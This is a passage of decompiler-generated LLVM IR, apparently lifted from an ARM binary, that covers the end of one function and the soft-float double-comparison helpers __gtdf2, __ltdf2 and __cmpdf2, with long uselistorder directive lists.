dec_label_pc_17e8c:                               ; preds = %bb113
  %v0_17e8c = load i32, i32* @r1, align 4
  %v1_17e8c = load i32, i32* %r0.global-to-local, align 4
  %v4_17e8c = mul i32 %v1_17e8c, 4096
  %v5_17e8c = or i32 %v4_17e8c, %v0_17e8c
  store i32 %v5_17e8c, i32* %r4.global-to-local, align 4
  %v1_17e90 = icmp ne i32 %v5_17e8c, 0
  call void @__pseudo_cond_branch(i1 %v1_17e90, i32 ptrtoint (i32* @global_var_17cd4.660 to i32))
  %v0_17e94 = load i32, i32* @r5, align 4
  %v1_17e94 = load i32, i32* %ip.global-to-local, align 4
  %v1_17e98 = icmp ne i32 %v1_17e94, %v0_17e94
  call void @__pseudo_cond_branch(i1 %v1_17e98, i32 ptrtoint (i32* @global_var_17cbc.661 to i32))
  store i32 %arg4, i32* @r1, align 4
  store i32 %arg3, i32* %r0.global-to-local, align 4
  %v2_17ea4 = call i32 @function_17cd4(i32 %arg3, i32 %arg4)
  store i32 %v2_17ea4, i32* %r0.global-to-local, align 4
  %v1_17ea8.pre = load i32, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_17ea8

dec_label_pc_17ea8:                               ; preds = %bb113, %dec_label_pc_17e8c
  %v1_17ea8 = phi i32 [ %v1_17e84, %bb113 ], [ %v1_17ea8.pre, %dec_label_pc_17e8c ]
  %v0_17ea8 = load i32, i32* @r5, align 4
  %v4_17ea8 = icmp eq i32 %v0_17ea8, %v1_17ea8
  br i1 %v4_17ea8, label %dec_label_pc_17eb0, label %dec_label_pc_17ea8.dec_label_pc_17ec4_crit_edge

dec_label_pc_17ea8.dec_label_pc_17ec4_crit_edge:  ; preds = %dec_label_pc_17ea8
  %v1_17ec4.pre = load i32, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_17ec4

dec_label_pc_17eb0:                               ; preds = %dec_label_pc_17ea8
  %v4_17eb0 = mul i32 %arg3, 4096
  %v5_17eb0 = or i32 %v4_17eb0, %arg4
  store i32 %v5_17eb0, i32* %r5.global-to-local, align 4
  %v7_17eb0 = icmp eq i32 %v5_17eb0, 0
  call void @__pseudo_cond_branch(i1 %v7_17eb0, i32 ptrtoint (i32* @global_var_17c70.662 to i32))
  store i32 %arg4, i32* @r1, align 4
  store i32 %arg3, i32* %r0.global-to-local, align 4
  %v2_17ec0 = call i32 @function_17cd4(i32 %arg3, i32 %arg4)
  store i32 %v2_17ec0, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_17ec4

dec_label_pc_17ec4:                               ; preds = %dec_label_pc_17ea8.dec_label_pc_17ec4_crit_edge, %dec_label_pc_17eb0
  %v1_17ec4 = phi i32 [ %v1_17ec4.pre, %dec_label_pc_17ea8.dec_label_pc_17ec4_crit_edge ], [ %v2_17ec0, %dec_label_pc_17eb0 ]
  %v0_17ec4 = load i32, i32* @r1, align 4
  %v3_17ec4 = mul i32 %v1_17ec4, 2
  %v4_17ec4 = or i32 %v3_17ec4, %v0_17ec4
  store i32 %v4_17ec4, i32* %r6.global-to-local, align 4
  %v6_17ec4 = icmp eq i32 %v4_17ec4, 0
  br i1 %v6_17ec4, label %dec_label_pc_17ec4._crit_edge, label %bb114

dec_label_pc_17ec4._crit_edge:                    ; preds = %dec_label_pc_17ec4
  %.pre = mul i32 %arg3, 2
  %.pre80 = or i32 %.pre, %arg4
  br label %bb115

bb114:                                            ; preds = %dec_label_pc_17ec4
  %v4_17ec8 = mul i32 %arg3, 2
  %v5_17ec8 = or i32 %v4_17ec8, %arg4
  store i32 %v5_17ec8, i32* %r6.global-to-local, align 4
  %phitmp = icmp ne i32 %v5_17ec8, 0
  br label %bb115

bb115:                                            ; preds = %dec_label_pc_17ec4._crit_edge, %bb114
  %v4_17ed8.pre-phi = phi i32 [ %.pre80, %dec_label_pc_17ec4._crit_edge ], [ %v5_17ec8, %bb114 ]
  %v0_17ecc = phi i1 [ false, %dec_label_pc_17ec4._crit_edge ], [ %phitmp, %bb114 ]
  call void @__pseudo_cond_branch(i1 %v0_17ecc, i32 ptrtoint (i32* @global_var_17c08.663 to i32))
  %v0_17ed0 = load i32, i32* @r1, align 4
  %v1_17ed0 = load i32, i32* %r0.global-to-local, align 4
  %v3_17ed0 = mul i32 %v1_17ed0, 2
  %v4_17ed0 = or i32 %v3_17ed0, %v0_17ed0
  store i32 %v4_17ed0, i32* %r4.global-to-local, align 4
  %v1_17ed4 = icmp ne i32 %v4_17ed0, 0
  call void @__pseudo_cond_branch(i1 %v1_17ed4, i32 ptrtoint (i32* @global_var_17cbc.661 to i32))
  store i32 %v4_17ed8.pre-phi, i32* %r5.global-to-local, align 4
  %v1_17edc = icmp ne i32 %v4_17ed8.pre-phi, 0
  call void @__pseudo_cond_branch(i1 %v1_17edc, i32 ptrtoint (i32* @global_var_17c70.662 to i32))
  %v0_17ee0 = load i32, i32* %r0.global-to-local, align 4
  %v1_17ee0 = load i32, i32* @r1, align 4
  %v2_17ee0 = call i32 @function_17cd4(i32 %v0_17ee0, i32 %v1_17ee0)
  store i32 %v2_17ee0, i32* %r0.global-to-local, align 4
  ret i32 %v2_17ee0

; uselistorder directives
  uselistorder i32 %v5_17ec8, { 1, 0, 2 }
  uselistorder i32 %v1_17e84, { 1, 0 }
  uselistorder i32 %v10_17e50, { 2, 0, 1 }
  uselistorder i32 %v6_17e4c, { 3, 4, 0, 1, 2, 6, 5, 7 }
  uselistorder i32 %v5_17e48, { 1, 0, 2 }
  uselistorder i32 %v2_17e30, { 1, 0, 2 }
  uselistorder i32 %v1_17e30, { 1, 0, 2 }
  uselistorder i32 %v1_17e2c, { 1, 0, 2 }
  uselistorder i32 %v0_17e2c, { 1, 0, 2 }
  uselistorder i1 %v7_17e20, { 1, 0 }
  uselistorder i32 %v2_17e04, { 1, 0 }
  uselistorder i32 %v3_17df0, { 2, 1, 0 }
  uselistorder i32 %v3_17de4, { 0, 2, 1 }
  uselistorder i32 %v5_17de0, { 2, 0, 1 }
  uselistorder i32 %v6_17dd0, { 2, 1, 0, 3, 4 }
  uselistorder i32 %v15_17dbc, { 2, 0, 1, 3, 4 }
  uselistorder i32 %v3_17db8, { 3, 0, 2, 1 }
  uselistorder i32 %v0_17dc4, { 0, 2, 1 }
  uselistorder i32 %v1_17dd0, { 1, 0 }
  uselistorder i32 %v6_17db4, { 2, 1, 0, 3, 4 }
  uselistorder i32 %v15_17da0, { 1, 2, 0, 3 }
  uselistorder i32 %v3_17d9c, { 0, 2, 1 }
  uselistorder i32 %v0_17da8, { 0, 2, 1 }
  uselistorder i32 %v1_17db4, { 1, 0 }
  uselistorder i32 %v6_17d98, { 2, 1, 0, 3, 4 }
  uselistorder i32 %v15_17d84, { 1, 2, 0, 3 }
  uselistorder i32 %v0_17d8c, { 0, 2, 1 }
  uselistorder i32 %v1_17d98, { 1, 0 }
  uselistorder i32 %v3_17d7c, { 2, 1, 0, 3, 4 }
  uselistorder i1 %v3_17d70, { 1, 2, 0 }
  uselistorder i32 %v3_17df013, { 3, 4, 2, 1, 0 }
  uselistorder i32 %v5_17dec17, { 0, 1, 2, 3, 5, 6, 4 }
  uselistorder i32 %v0_17d70, { 0, 3, 2, 1 }
  uselistorder i32 %v1_17d7c, { 1, 0 }
  uselistorder i32 %storemerge136, { 2, 1, 0, 3, 4 }
  uselistorder i32 %v1_17e18.ph, { 1, 0, 3, 2 }
  uselistorder i32 %v3_17d5c, { 1, 0 }
  uselistorder i32 %v0_17d60, { 1, 0 }
  uselistorder i32 %v3_17d4c, { 1, 0 }
  uselistorder i1 %v1_17d40, { 1, 0 }
  uselistorder i32 %v3_17d30, { 2, 3, 1, 0 }
  uselistorder i32 %v5_17d2c, { 3, 2, 1, 0 }
  uselistorder i32 %v3_17d24, { 2, 1, 0 }
  uselistorder i32 %v5_17d20, { 1, 0, 2, 3, 4 }
  uselistorder i32 %v2_17d00, { 1, 5, 6, 4, 2, 3, 0, 7, 10, 9, 8, 11 }
  uselistorder i32 %v6_17cf0, { 2, 3, 1, 0 }
  uselistorder i32 %v5_17cf0, { 2, 1, 0, 3, 4 }
  uselistorder i32 %v5_17cec, { 5, 4, 3, 2, 6, 1, 0 }
  uselistorder i32 %v1_17cec, { 0, 1, 2, 4, 3 }
  uselistorder i32 %v6_17ce0, { 1, 0 }
  uselistorder i32* %r6.global-to-local, { 0, 1, 2, 8, 3, 4, 5, 6, 7, 9, 10 }
  uselistorder i32* %r5.global-to-local, { 0, 1, 2, 3, 4, 10, 5, 6, 7, 8, 9, 11, 12, 13, 14 }
  uselistorder i32* %r3.global-to-local, { 2, 3, 1, 4, 5, 6, 0 }
  uselistorder i32* %r2.global-to-local, { 2, 3, 1, 4, 5, 6, 0 }
  uselistorder i32* %r1.global-to-local, { 1, 6, 7, 2, 3, 4, 5, 8, 0 }
  uselistorder i32* %r0.global-to-local, { 9, 17, 18, 6, 3, 19, 20, 4, 15, 16, 21, 5, 2, 7, 8, 12, 10, 11, 13, 14, 0, 1 }
  uselistorder i32* %ip.global-to-local, { 9, 7, 8, 6, 0, 1, 2, 3, 4, 5, 10 }
  uselistorder i32 (i32, i32)* @function_17cd4, { 2, 1, 0 }
  uselistorder i32 (i32)* @function_17b58, { 1, 0 }
  uselistorder i1* @cpsr_n, { 1, 2, 3, 4, 5, 6, 0 }
  uselistorder i32 1024, { 2, 0, 14, 15, 3, 16, 1, 17, 18, 19, 5, 12, 13, 4, 8, 9, 7, 10, 6, 11, 20 }
  uselistorder i32 -1023, { 2, 0, 1, 3 }
  uselistorder void (i1, i32)* @__pseudo_cond_branch, { 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 2, 1, 14, 15, 16, 17, 20, 25, 26, 27, 24, 31, 29, 30, 28, 22, 18, 19, 0, 23, 3, 21 }
  uselistorder i32 536870912, { 2, 3, 0, 4, 1 }
  uselistorder i32 16, { 1, 6, 4, 5, 7, 8, 27, 9, 10, 2, 11, 12, 90, 91, 92, 0, 93, 94, 13, 14, 95, 96, 15, 97, 98, 99, 100, 67, 68, 110, 111, 35, 36, 37, 117, 38, 118, 119, 39, 120, 121, 40, 122, 123, 124, 125, 126, 127, 101, 105, 106, 69, 70, 71, 72, 73, 74, 75, 76, 77, 78, 102, 41, 79, 32, 61, 42, 58, 88, 59, 112, 113, 128, 30, 107, 108, 80, 81, 82, 83, 84, 85, 54, 103, 104, 60, 109, 29, 16, 17, 18, 19, 20, 21, 28, 22, 23, 3, 24, 25, 33, 44, 45, 62, 63, 64, 46, 65, 66, 47, 43, 48, 86, 87, 55, 56, 49, 57, 89, 31, 34, 50, 114, 115, 51, 116, 26, 52, 53 }
  uselistorder i32 8, { 3, 4, 5, 6, 7, 8, 59, 60, 30, 9, 10, 21, 11, 118, 119, 120, 121, 0, 1, 122, 123, 124, 125, 126, 12, 127, 67, 52, 53, 61, 128, 129, 130, 131, 27, 132, 83, 150, 161, 43, 162, 163, 164, 165, 166, 167, 168, 169, 170, 171, 172, 173, 174, 175, 176, 44, 133, 84, 85, 86, 87, 88, 89, 90, 91, 92, 13, 45, 93, 37, 94, 95, 62, 96, 97, 98, 134, 135, 136, 178, 31, 68, 14, 117, 148, 69, 70, 42, 154, 153, 151, 152, 72, 73, 74, 155, 156, 157, 158, 159, 160, 15, 145, 146, 2, 177, 48, 49, 46, 47, 23, 24, 34, 35, 50, 179, 99, 137, 138, 100, 101, 63, 102, 103, 104, 105, 28, 106, 56, 57, 107, 108, 109, 51, 110, 111, 112, 113, 33, 25, 26, 114, 115, 58, 139, 140, 71, 141, 142, 29, 143, 144, 16, 17, 64, 32, 18, 19, 22, 20, 75, 76, 77, 54, 78, 79, 80, 81, 55, 82, 116, 41, 40, 39, 65, 66, 38, 36, 147, 149 }
  uselistorder i32 4, { 8, 9, 175, 253, 254, 176, 10, 11, 114, 115, 116, 264, 265, 266, 267, 268, 269, 270, 0, 12, 76, 271, 272, 273, 274, 275, 276, 277, 74, 278, 117, 118, 119, 279, 281, 97, 282, 86, 283, 13, 14, 1, 206, 213, 214, 215, 216, 217, 284, 285, 286, 98, 120, 121, 122, 123, 124, 125, 289, 126, 127, 297, 298, 99, 128, 15, 218, 16, 96, 87, 88, 17, 340, 89, 78, 18, 19, 90, 91, 341, 342, 343, 344, 92, 345, 346, 347, 348, 93, 349, 350, 351, 352, 353, 20, 354, 355, 356, 357, 358, 94, 77, 359, 360, 361, 362, 363, 364, 21, 22, 95, 291, 292, 100, 219, 220, 221, 222, 101, 223, 224, 225, 226, 227, 75, 228, 229, 230, 231, 232, 290, 233, 365, 366, 367, 369, 370, 129, 130, 131, 314, 315, 316, 317, 23, 189, 132, 190, 133, 79, 191, 255, 134, 256, 257, 2, 307, 308, 309, 310, 135, 136, 192, 137, 3, 138, 193, 24, 194, 80, 139, 140, 320, 322, 321, 318, 319, 195, 196, 197, 198, 323, 324, 325, 326, 327, 328, 329, 330, 331, 141, 142, 143, 144, 299, 300, 301, 302, 303, 304, 4, 25, 305, 368, 234, 26, 27, 28, 29, 5, 280, 30, 145, 64, 31, 32, 199, 146, 33, 147, 148, 149, 150, 151, 235, 34, 236, 152, 237, 238, 239, 240, 241, 242, 243, 153, 244, 245, 246, 247, 248, 249, 65, 252, 154, 155, 251, 177, 250, 293, 294, 102, 295, 296, 287, 288, 35, 36, 82, 37, 38, 83, 332, 333, 178, 39, 40, 41, 42, 66, 43, 200, 44, 45, 67, 46, 47, 156, 48, 201, 103, 202, 203, 204, 205, 208, 207, 209, 210, 84, 212, 49, 211, 85, 104, 50, 157, 68, 109, 179, 158, 159, 160, 161, 108, 162, 163, 106, 180, 107, 51, 164, 105, 52, 181, 182, 183, 184, 185, 186, 187, 113, 53, 54, 81, 165, 258, 259, 260, 261, 262, 263, 110, 306, 166, 69, 70, 55, 311, 56, 57, 111, 71, 167, 112, 58, 59, 72, 168, 312, 169, 73, 170, 171, 60, 313, 61, 62, 63, 334, 335, 336, 337, 338, 339, 172, 173, 174, 6, 7, 188 }
  uselistorder i32 32, { 60, 61, 62, 63, 28, 29, 36, 49, 50, 31, 64, 30, 37, 65, 66, 67, 68, 34, 69, 81, 82, 83, 0, 84, 85, 51, 93, 94, 38, 39, 32, 70, 43, 20, 71, 72, 54, 55, 4, 3, 6, 5, 8, 7, 1, 33, 88, 86, 87, 73, 19, 74, 2, 44, 75, 76, 77, 78, 79, 21, 80, 52, 53, 89, 90, 91, 92, 95, 45, 56, 46, 35, 57, 58, 59, 10, 9, 22, 40, 47, 23, 12, 11, 14, 13, 24, 16, 15, 25, 26, 18, 17, 27, 41, 42, 48 }
  uselistorder i32 33, { 3, 4, 5, 2, 6, 7, 8, 1, 0 }
  uselistorder i32 768, { 1, 0, 2 }
  uselistorder i32 268435456, { 1, 2, 3, 0, 4, 5, 6, 7, 8, 9 }
  uselistorder i32 16777216, { 1, 2, 0, 4, 3, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 28, 27, 29, 30, 31, 32, 33, 34, 35, 36, 39, 37, 40, 38, 43, 41, 44, 42, 46, 45, 48, 47, 50, 49, 52, 51 }
  uselistorder i32 256, { 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 153, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 0, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 62, 63, 64, 65, 145, 66, 67, 150, 68, 151, 69, 152, 70, 71, 72, 73, 74, 75, 76, 77, 78, 79, 80, 81, 146, 1, 82, 83, 86, 85, 84, 89, 88, 87, 90, 91, 92, 93, 94, 95, 154, 96, 97, 98, 144, 103, 99, 100, 104, 101, 102, 105, 110, 106, 107, 109, 108, 111, 113, 112, 147, 114, 148, 116, 115, 117, 118, 119, 122, 120, 121, 123, 124, 125, 127, 126, 128, 129, 130, 133, 131, 132, 134, 135, 137, 136, 138, 139, 140, 141, 142, 143, 149 }
  uselistorder i32 1048576, { 19, 0, 1, 2, 20, 21, 13, 3, 4, 5, 22, 6, 7, 23, 24, 14, 15, 8, 9, 25, 26, 27, 18, 28, 10, 16, 11, 17, 12 }
  uselistorder i32 2047, { 5, 6, 7, 2, 0, 3, 8, 1, 4, 9 }
  uselistorder i32* @r6, { 14, 55, 56, 57, 58, 59, 60, 112, 113, 114, 115, 116, 117, 118, 119, 120, 121, 122, 123, 11, 124, 125, 126, 127, 128, 129, 130, 131, 132, 133, 134, 135, 136, 137, 138, 139, 140, 141, 1, 0, 19, 20, 21, 22, 23, 142, 2, 143, 144, 145, 152, 153, 154, 155, 61, 3, 62, 63, 64, 156, 160, 159, 161, 162, 163, 181, 182, 183, 184, 185, 186, 187, 188, 189, 190, 191, 65, 66, 67, 68, 69, 70, 71, 72, 73, 74, 75, 4, 76, 77, 78, 79, 80, 81, 82, 215, 220, 29, 30, 24, 25, 26, 108, 109, 110, 111, 27, 28, 31, 32, 33, 34, 35, 36, 37, 38, 212, 213, 214, 192, 193, 5, 194, 195, 196, 197, 198, 199, 209, 13, 210, 211, 6, 83, 200, 201, 202, 203, 204, 205, 146, 147, 148, 149, 150, 151, 84, 85, 86, 87, 88, 89, 90, 91, 164, 165, 166, 167, 168, 7, 12, 169, 39, 8, 40, 41, 170, 9, 171, 172, 92, 93, 98, 99, 100, 101, 102, 103, 104, 105, 106, 107, 16, 17, 18, 94, 95, 96, 97, 216, 217, 218, 219, 15, 173, 174, 175, 176, 10, 177, 178, 179, 180, 157, 158, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 206, 207, 208 }
  uselistorder i32* @r5, { 99, 100, 101, 29, 102, 103, 104, 105, 106, 107, 108, 109, 40, 41, 110, 42, 111, 112, 113, 114, 115, 116, 117, 118, 119, 120, 121, 199, 200, 201, 202, 203, 204, 205, 8, 206, 207, 208, 209, 210, 211, 212, 5, 213, 214, 215, 216, 217, 218, 219, 220, 221, 222, 223, 224, 225, 226, 227, 228, 26, 43, 9, 3, 44, 229, 239, 230, 231, 232, 22, 244, 240, 241, 242, 243, 245, 246, 247, 122, 123, 124, 125, 126, 127, 128, 129, 130, 131, 132, 10, 133, 134, 248, 252, 11, 254, 253, 4, 255, 12, 270, 271, 272, 273, 274, 275, 276, 277, 278, 279, 280, 281, 282, 284, 283, 24, 285, 93, 94, 95, 96, 97, 98, 321, 322, 135, 136, 137, 138, 139, 140, 141, 323, 324, 325, 326, 327, 328, 329, 330, 331, 332, 333, 334, 142, 0, 143, 144, 145, 146, 147, 148, 335, 336, 337, 338, 1, 339, 340, 341, 56, 57, 58, 59, 60, 61, 45, 46, 47, 48, 49, 50, 51, 197, 13, 7, 198, 52, 53, 62, 63, 64, 65, 66, 67, 68, 309, 310, 311, 312, 313, 314, 315, 316, 317, 318, 319, 320, 69, 70, 71, 286, 287, 288, 289, 290, 291, 292, 293, 294, 295, 296, 30, 306, 307, 14, 308, 343, 344, 345, 346, 31, 149, 15, 150, 151, 152, 297, 298, 299, 300, 301, 302, 233, 234, 235, 236, 237, 238, 153, 16, 154, 155, 156, 157, 158, 17, 258, 259, 260, 18, 256, 257, 72, 73, 74, 261, 262, 263, 159, 160, 27, 161, 162, 19, 163, 164, 165, 166, 167, 168, 25, 169, 170, 171, 172, 28, 176, 20, 177, 178, 179, 180, 181, 182, 183, 184, 6, 185, 186, 187, 188, 189, 190, 38, 39, 173, 2, 174, 175, 55, 54, 23, 347, 348, 264, 265, 266, 267, 21, 268, 269, 191, 192, 193, 194, 195, 196, 249, 250, 251, 75, 76, 77, 78, 79, 80, 81, 82, 83, 84, 342, 85, 86, 87, 88, 89, 90, 91, 92, 32, 33, 34, 35, 36, 37, 303, 304, 305 }
  uselistorder i32 %arg4, { 3, 2, 8, 7, 9, 6, 5, 0, 1, 4, 10 }
  uselistorder i32 %arg3, { 0, 1, 11, 10, 2, 9, 8, 3, 4, 7, 5, 6, 12 }
  uselistorder label %bb115, { 1, 0 }
  uselistorder label %dec_label_pc_17ec4, { 1, 0 }
  uselistorder label %dec_label_pc_17ea8, { 1, 0 }
  uselistorder label %bb113, { 1, 0 }
  uselistorder label %dec_label_pc_17e74, { 3, 2, 1, 0 }
  uselistorder label %bb109, { 1, 0 }
  uselistorder label %.thread12, { 2, 1, 0 }
  uselistorder label %bb105, { 1, 0 }
  uselistorder label %.thread11, { 0, 2, 1 }
  uselistorder label %.thread10, { 1, 0 }
  uselistorder label %.thread8, { 1, 0 }
  uselistorder label %.thread6, { 1, 0 }
  uselistorder label %.thread4, { 1, 0 }
  uselistorder label %dec_label_pc_17d6c, { 1, 0 }
  uselistorder label %dec_label_pc_17d54, { 1, 0 }
  uselistorder label %bb97, { 1, 0 }
  uselistorder label %.thread2, { 1, 0 }
}

define i32 @__gtdf2() local_unnamed_addr {
entry:
  store i32 -1, i32* @ip, align 4
  %v0_17ee8 = call i32 @function_17ef8()
  ret i32 %v0_17ee8
}

define i32 @__ltdf2() local_unnamed_addr {
entry:
  store i32 1, i32* @ip, align 4
  %v0_17ef0 = call i32 @function_17ef8()
  ret i32 %v0_17ef0

; uselistorder directives
  uselistorder i32 ()* @function_17ef8, { 1, 0 }
}

define i32 @__cmpdf2() local_unnamed_addr {
entry:
  %v0_17ef4 = load i32, i32* @r0, align 4
  ret i32 %v0_17ef4
}

define i32 @function_17ef8() local_unnamed_addr {
dec_label_pc_17ef8:
  %v0_17ef8 = load i32, i32* @ip, align 4
  %v0_17efc = load i32, i32* @r0, align 4
  %v2_17efc = mul i32 %v0_17efc, 2
  %v2_17efc.off = add i32 %v2_17efc, 4194303
  %tmp = icmp ult i32 %v2_17efc.off, 2097152
  %v0_17f04 = load i32, i32* @r2, align 4
  %v2_17f04 = mul i32 %v0_17f04, 2
  br i1 %tmp, label %dec_label_pc_17f54, label %bb

bb:                                               ; preds = %dec_label_pc_17ef8
  %v2_17f04.off = add i32 %v2_17f04, 4194303
  %tmp26 = icmp ult i32 %v2_17f04.off, 2097152
  br i1 %tmp26, label %dec_label_pc_17f48, label %dec_label_pc_17f10

dec_label_pc_17f10:                               ; preds = %dec_label_pc_17f5c, %dec_label_pc_17f68, %bb
  %v0_17f10 = load i32, i32* @r1, align 4
  %v4_17f10 = or i32 %v0_17f10, %v2_17efc
  %v6_17f10 = icmp eq i32 %v4_17f10, 0
  br i1 %v6_17f10, label %bb14, label %.thread

bb14:                                             ; preds = %dec_label_pc_17f10
  %v1_17f14 = load i32, i32* @r3, align 4
  %v5_17f14 = or i32 %v1_17f14, %v2_17f04
  %v7_17f14 = icmp eq i32 %v5_17f14, 0
  br i1 %v7_17f14, label %.thread1, label %.thread

.thread:                                          ; preds = %dec_label_pc_17f10, %bb14
  %v3_17f18 = xor i32 %v0_17f04, %v0_17efc
  %v5_17f18 = icmp eq i32 %v3_17f18, 0
  br i1 %v5_17f18, label %.thread..thread1_crit_edge, label %.thread2.thread

.thread..thread1_crit_edge:                       ; preds = %.thread
  %v2_17f1c.pre = load i32, i32* @r3, align 4
  br label %.thread1

.thread1:                                         ; preds = %.thread..thread1_crit_edge, %bb14
  %v2_17f1c = phi i32 [ %v2_17f1c.pre, %.thread..thread1_crit_edge ], [ %v1_17f14, %bb14 ]
  %v5_17f1c = icmp eq i32 %v2_17f1c, %v0_17f10
  br i1 %v5_17f1c, label %bb15, label %.thread1..thread2.thread_crit_edge

.thread1..thread2.thread_crit_edge:               ; preds = %.thread1
  %.pre24 = xor i32 %v0_17f04, %v0_17efc
  br label %.thread2.thread

bb15:                                             ; preds = %.thread1
  ret i32 0

.thread2.thread:                                  ; preds = %.thread1..thread2.thread_crit_edge, %.thread
  %v2_17f2c.pre-phi = phi i32 [ %.pre24, %.thread1..thread2.thread_crit_edge ], [ %v3_17f18, %.thread ]
  %v3_17f2c = icmp slt i32 %v2_17f2c.pre-phi, 0
  br i1 %v3_17f2c, label %..thread7_crit_edge, label %bb16

bb16:                                             ; preds = %.thread2.thread
  %v10_17f30 = icmp eq i32 %v0_17efc, %v0_17f04
  br i1 %v10_17f30, label %bb17, label %bb18

bb17:                                             ; preds = %bb16
  %v2_17f34 = load i32, i32* @r3, align 4
  %v4_17f34 = icmp ult i32 %v0_17f10, %v2_17f34
  br i1 %v4_17f34, label %..thread7_crit_edge, label %bb19

bb18:                                             ; preds = %bb16
  %v4_17f30 = icmp ult i32 %v0_17efc, %v0_17f04
  br i1 %v4_17f30, label %..thread7_crit_edge, label %bb19

..thread7_crit_edge:                              ; preds = %bb17, %bb18, %.thread2.thread
  %.pre12 = ashr i32 %v0_17f04, 31
  br label %.thread7

bb19:                                             ; preds = %bb17, %bb18
  %v2_17f38 = and i32 %v0_17f04, 1073741824
  %v3_17f38 = icmp eq i32 %v2_17f38, 0
  %v4_17f38 = ashr i32 %v0_17f04, 31
  br i1 %v3_17f38, label %.thread7, label %bb20

.thread7:                                         ; preds = %bb19, %..thread7_crit_edge
  %v4_17f3c.pre-phi = phi i32 [ %.pre12, %..thread7_crit_edge ], [ %v4_17f38, %bb19 ]
  %v5_17f3c = sub nsw i32 -1, %v4_17f3c.pre-phi
  br label %bb20

bb20:                                             ; preds = %bb19, %.thread7
  %v0_17f40 = phi i32 [ %v4_17f38, %bb19 ], [ %v5_17f3c, %.thread7 ]
  %v1_17f40 = or i32 %v0_17f40, 1
  ret i32 %v1_17f40

dec_label_pc_17f48:                               ; preds = %bb
  br label %dec_label_pc_17f5c

dec_label_pc_17f54:                               ; preds = %dec_label_pc_17ef8
  %v0_17f54 = load i32, i32* @r1, align 4
  %v4_17f54 = mul i32 %v0_17efc, 4096
  %v5_17f54 = or i32 %v0_17f54, %v4_17f54
  %v7_17f54 = icmp eq i32 %v5_17f54, 0
  br i1 %v7_17f54, label %dec_label_pc_17f54.dec_label_pc_17f5c_crit_edge, label %dec_label_pc_17f70

dec_label_pc_17f54.dec_label_pc_17f5c_crit_edge:  ; preds = %dec_label_pc_17f54
  %v2_17f04.off25 = add i32 %v2_17f04, 4194303
  %tmp27 = icmp ult i32 %v2_17f04.off25, 2097152
  br label %dec_label_pc_17f5c

dec_label_pc_17f5c:                               ; preds = %dec_label_pc_17f54.dec_label_pc_17f5c_crit_edge, %dec_label_pc_17f48
  %v3_17f60.pre-phi = phi i1 [ %tmp27, %dec_label_pc_17f54.dec_label_pc_17f5c_crit_edge ], [ true, %dec_label_pc_17f48 ]
  br i1 %v3_17f60.pre-phi, label %dec_label_pc_17f68, label %dec_label_pc_17f10

dec_label_pc_17f68:                               ; preds = %dec_label_pc_17f5c
  %v0_17f68 = load i32, i32* @r3, align 4
  %v4_17f68 = mul i32 %v0_17f04, 4096
  %v5_17f68 = or i32 %v0_17f68, %v4_17f68
  %v7_17f68 = icmp eq i32 %v5_17f68, 0
  br i1 %v7_17f68, label %dec_label_pc_17f10, label %dec_label_pc_17f70

dec_label_pc_17f70:                               ; preds = %dec_label_pc_17f54, %dec_label_pc_17f68
  ret i32 %v0_17ef8

; uselistorder directives
  uselistorder i32 %v4_17f38, { 1, 0 }
  uselistorder i32 %v1_17f14, { 1, 0 }
  uselistorder i32 %v0_17f10, { 2, 0, 1 }
  uselistorder i32 %v2_17f04, { 0, 2, 1 }
  uselistorder i32 %v0_17f04, { 0, 5, 6, 4, 8, 7, 2, 3, 1 }
  uselistorder i32 %v2_17efc, { 1, 0 }
  uselistorder i32 %v0_17efc, { 0, 4, 5, 2, 3, 1 }
  uselistorder i32 1073741824, { 2, 3, 4, 5, 0, 1 }
  uselistorder i32 31, { 17, 7, 5, 12, 14, 18, 6, 22, 15, 4, 19, 2, 1, 0, 8, 10, 9, 11, 3, 20, 21, 16, 13 }
  uselistorder i32* @r3, { 6, 7, 1, 8, 9, 10, 0, 11, 3, 12, 21, 2, 22, 23, 13, 14, 24, 15, 16, 17, 18, 4, 5, 27, 30, 28, 29, 25, 19, 20, 26, 31 }
  uselistorder i32* @r1, { 75, 76, 13, 77, 78, 79, 80, 81, 82, 14, 83, 84, 85, 86, 87, 88, 89, 90, 91, 92, 93, 32, 15, 33, 94, 34, 0, 4, 95, 12, 96, 97, 98, 99, 11, 100, 101, 102, 127, 128, 2, 129, 130, 131, 134, 132, 133, 16, 17, 35, 135, 136, 137, 138, 139, 140, 141, 142, 5, 143, 144, 103, 145, 146, 147, 148, 151, 154, 155, 156, 157, 158, 159, 6, 65, 66, 19, 185, 186, 187, 188, 189, 190, 191, 192, 193, 194, 195, 196, 197, 198, 199, 200, 201, 202, 203, 204, 205, 206, 8, 207, 208, 209, 210, 211, 212, 213, 214, 215, 216, 217, 218, 219, 220, 221, 222, 223, 224, 225, 226, 227, 228, 229, 230, 7, 231, 232, 18, 149, 150, 104, 105, 106, 107, 108, 109, 110, 111, 112, 21, 26, 27, 233, 3, 234, 36, 37, 173, 48, 49, 236, 174, 179, 180, 183, 181, 182, 175, 176, 177, 178, 38, 235, 39, 22, 160, 166, 171, 170, 237, 238, 239, 113, 114, 115, 23, 169, 24, 116, 161, 162, 163, 164, 165, 9, 10, 20, 117, 118, 119, 1, 120, 121, 122, 25, 29, 30, 31, 152, 153, 123, 124, 28, 40, 41, 42, 43, 44, 45, 46, 47, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 62, 63, 64, 67, 68, 69, 70, 71, 72, 73, 74, 125, 126, 167, 168, 172, 184 }
